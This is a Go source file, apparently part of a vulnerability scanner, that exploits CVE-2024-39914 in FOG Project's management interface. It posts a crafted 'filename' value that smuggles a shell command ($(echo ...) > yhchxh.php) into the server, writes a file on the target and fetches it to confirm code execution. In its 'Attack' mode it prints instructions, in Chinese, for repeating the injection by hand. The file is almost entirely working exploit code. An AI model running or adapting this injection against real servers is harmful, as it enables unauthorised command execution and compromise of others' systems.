package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func CVE_2024_39914(url string, Attack bool) error {
	payload := `
fogguiuser=fog&nojson=2
`
	// 创建自定义的 Transport(禁用SSL)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	url1 := fmt.Sprintf("%s/fog/management/export.php?filename=$(echo+'yhchxh'+>+yhchxh.php)&type=pdf", url)
	//fmt.Println(url2)
	request, err := http.NewRequest("POST", url1, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	url3 := fmt.Sprintf("%s/management/export.php?filename=$(echo+'yhchxh'+>+yhchxh.php)&type=pdf", url)
	//fmt.Println(url2)
	request3, err := http.NewRequest("POST", url3, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response3, err := client.Do(request3)
	if err != nil {
		return err
	}

	url2 := ""
	if response3.StatusCode == 200 {
		url2 = fmt.Sprintf("%s/management/yhchxh.php", url)
	} else {
		url2 = fmt.Sprintf("%s/fog/management/yhchxh.php", url)
	}

	request2, err := http.NewRequest("POST", url2, strings.NewReader(payload))
	if err != nil {
		return err
	}
	request2.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request2.Header.Add("Content-Length", fmt.Sprint(strings.NewReader(payload).Len()))

	response2, err := client.Do(request2)
	if err != nil {
		return err
	}
	body2, err := ioutil.ReadAll(response2.Body)
	if err != nil {
		return err
	}

	if strings.Contains(string(body2), "yhchxh") && response2.StatusCode == 200 {
		fmt.Println("[*]CVE-2024-39914 : " + url)
		if Attack {
			if response3.StatusCode == 200 {
				fmt.Println("Attack-Result : " + "请使用POST方法请求/management/export.php?filename=$(echo+'yhchxh'+>+yhchxh.php)&type=pdf，并传入请求体`fogguiuser=fog&nojson=2`\n")
			} else {
				fmt.Println("Attack-Result : " + "请使用POST方法请求/fog/management/export.php?filename=$(echo+'yhchxh'+>+yhchxh.php)&type=pdf，并传入请求体`fogguiuser=fog&nojson=2`\n")
			}
		}
	}

	defer response.Body.Close()

	return nil
}
